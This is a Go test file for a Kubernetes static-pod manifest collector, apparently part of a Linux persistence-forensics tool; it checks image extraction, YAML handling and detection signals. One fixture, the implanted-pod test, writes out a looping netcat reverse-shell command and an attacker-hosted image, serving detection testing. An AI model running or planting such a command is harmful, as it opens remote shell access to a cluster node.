package k8sstatic

import (
	"context"
	"os"
	"path/filepath"
	"sort"
	"testing"

	"github.com/jarmidaw/linpersist/internal/core"
)

func writeManifest(t *testing.T, root, name, body string) {
	t.Helper()
	dir := filepath.Join(root, "/etc/kubernetes/manifests")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
		t.Fatalf("write %s: %v", name, err)
	}
}

func collect(t *testing.T, m *Module) []core.Record {
	t.Helper()
	var out []core.Record
	if err := m.Collect(context.Background(), func(r core.Record) { out = append(out, r) }); err != nil {
		t.Fatalf("Collect: %v", err)
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Locus < out[j].Locus })
	return out
}

// TestCollect_LegitimateApiserverManifest covers the canonical
// kubeadm-shipped kube-apiserver static pod. The agent must
// extract image as exec_target.
func TestCollect_LegitimateApiserverManifest(t *testing.T) {
	root := t.TempDir()
	writeManifest(t, root, "kube-apiserver.yaml", `
apiVersion: v1
kind: Pod
metadata:
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
    - name: kube-apiserver
      image: registry.k8s.io/kube-apiserver:v1.30.1
      command:
        - kube-apiserver
        - --advertise-address=10.0.0.1
`)
	m := New(Options{Root: root})
	recs := collect(t, m)
	if len(recs) != 1 {
		t.Fatalf("want 1 record, got %d", len(recs))
	}
	r := recs[0]
	if r.SiteClass != siteClassStaticPod {
		t.Errorf("site_class: got %q", r.SiteClass)
	}
	if r.ExecTarget != "registry.k8s.io/kube-apiserver:v1.30.1" {
		t.Errorf("exec_target: got %q", r.ExecTarget)
	}
	if len(r.MITRE) != 1 || r.MITRE[0] != mitreContainerService {
		t.Errorf("mitre: got %v", r.MITRE)
	}
}

// TestCollect_AttackerStaticPod fires the implant case: a malicious
// pod manifest dropped into the manifests dir, pulling from a non-
// registry-k8s image, with a reverse-shell-style command.
func TestCollect_AttackerStaticPod(t *testing.T) {
	root := t.TempDir()
	writeManifest(t, root, "kube-helper.yaml", `
apiVersion: v1
kind: Pod
metadata:
  name: kube-helper
  namespace: kube-system
spec:
  containers:
    - name: helper
      image: attacker.example.com/private/agent:latest
      command:
        - /bin/sh
        - -c
        - "while true; do nc -e /bin/sh 1.2.3.4 4444; sleep 60; done"
`)
	m := New(Options{Root: root})
	recs := collect(t, m)
	if len(recs) != 1 {
		t.Fatalf("want 1 record, got %d", len(recs))
	}
	if recs[0].ExecTarget != "attacker.example.com/private/agent:latest" {
		t.Errorf("exec_target: got %q", recs[0].ExecTarget)
	}
}

// TestCollect_BareImageName_FiresUnqualified: an image without a
// registry/project prefix is rare in legitimate static pods (those
// use full refs); the agent flags unqualified_exec_target.
func TestCollect_BareImageName_FiresUnqualified(t *testing.T) {
	root := t.TempDir()
	writeManifest(t, root, "weird.yaml", `
apiVersion: v1
kind: Pod
metadata:
  name: weird
spec:
  containers:
    - name: x
      image: nginx
`)
	m := New(Options{Root: root})
	recs := collect(t, m)
	found := false
	for _, s := range recs[0].Signals {
		if s == core.SignalUnqualifiedExecTarget {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected unqualified_exec_target on bare image name, got %v", recs[0].Signals)
	}
}

// TestCollect_NonYAMLIgnored: only *.yaml / *.yml emit, the
// kubelet itself loads only those.
func TestCollect_NonYAMLIgnored(t *testing.T) {
	root := t.TempDir()
	writeManifest(t, root, "README", "docs\n")
	writeManifest(t, root, "backup.yaml.bak", "backup\n")
	writeManifest(t, root, ".hidden.yaml", "apiVersion: v1\nkind: Pod\n")
	writeManifest(t, root, "real.yaml", `apiVersion: v1
kind: Pod
metadata: {name: real}
spec:
  containers:
    - name: c
      image: real/image:v1
`)
	m := New(Options{Root: root})
	recs := collect(t, m)
	if len(recs) != 1 {
		t.Fatalf("want 1 record (real.yaml only), got %d", len(recs))
	}
}

// TestCollect_BothExtensions: .yml and .yaml both honored, matching
// kubelet behaviour.
func TestCollect_BothExtensions(t *testing.T) {
	root := t.TempDir()
	writeManifest(t, root, "a.yaml", `apiVersion: v1
kind: Pod
metadata: {name: a}
spec:
  containers:
    - {name: c, image: img-a:1}
`)
	writeManifest(t, root, "b.yml", `apiVersion: v1
kind: Pod
metadata: {name: b}
spec:
  containers:
    - {name: c, image: img-b:1}
`)
	m := New(Options{Root: root})
	recs := collect(t, m)
	if len(recs) != 2 {
		t.Fatalf("want 2 records, got %d", len(recs))
	}
}

// TestCollect_MalformedYAML_EmitsParseError: a manifest with
// invalid YAML still emits the record (with PARSE_ERROR envelope)
// so the analyst sees the file existence.
func TestCollect_MalformedYAML_EmitsParseError(t *testing.T) {
	root := t.TempDir()
	writeManifest(t, root, "broken.yaml", "apiVersion: v1\nkind: Pod\n  [: bad indent")
	m := New(Options{Root: root})
	recs := collect(t, m)
	if len(recs) != 1 {
		t.Fatalf("want 1 record (with error envelope), got %d", len(recs))
	}
	found := false
	for _, e := range recs[0].Errors {
		if e.Code == "PARSE_ERROR" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected PARSE_ERROR envelope, got %+v", recs[0].Errors)
	}
}

// TestCollect_CustomRoots: an operator overriding Options.Roots can
// scan a non-default manifest path (k3s uses
// /var/lib/rancher/k3s/agent/pod-manifests on some installs).
func TestCollect_CustomRoots(t *testing.T) {
	root := t.TempDir()
	customDir := "/opt/k3s/manifests"
	if err := os.MkdirAll(filepath.Join(root, customDir), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(root, customDir, "pod.yaml"),
		[]byte(`apiVersion: v1
kind: Pod
metadata: {name: x}
spec:
  containers:
    - {name: c, image: img:1}
`), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}
	m := New(Options{Root: root, Roots: []string{customDir}})
	recs := collect(t, m)
	if len(recs) != 1 {
		t.Fatalf("want 1 record under custom roots, got %d", len(recs))
	}
	if recs[0].Locus != filepath.Join(customDir, "pod.yaml") {
		t.Errorf("locus: got %q", recs[0].Locus)
	}
}

// TestCanonical_StableAcrossYAMLFormatting verifies that two
// manifests with the same semantic content but different YAML
// formatting (flow vs block style) collapse to identical
// content_norm_sha256.
func TestCanonical_StableAcrossYAMLFormatting(t *testing.T) {
	root := t.TempDir()
	writeManifest(t, root, "flow.yaml",
		`{apiVersion: v1, kind: Pod, metadata: {name: x, namespace: kube-system}, spec: {containers: [{name: c, image: img:1}]}}`)
	writeManifest(t, root, "block.yaml", `
apiVersion: v1
kind: Pod
metadata:
  name: x
  namespace: kube-system
spec:
  containers:
    - name: c
      image: img:1
`)
	m := New(Options{Root: root})
	recs := collect(t, m)
	if len(recs) != 2 {
		t.Fatalf("want 2 records, got %d", len(recs))
	}
	if recs[0].ContentNormSHA256 != recs[1].ContentNormSHA256 {
		t.Errorf("flow and block YAML should produce same content_norm_sha256: %q vs %q",
			recs[0].ContentNormSHA256, recs[1].ContentNormSHA256)
	}
}
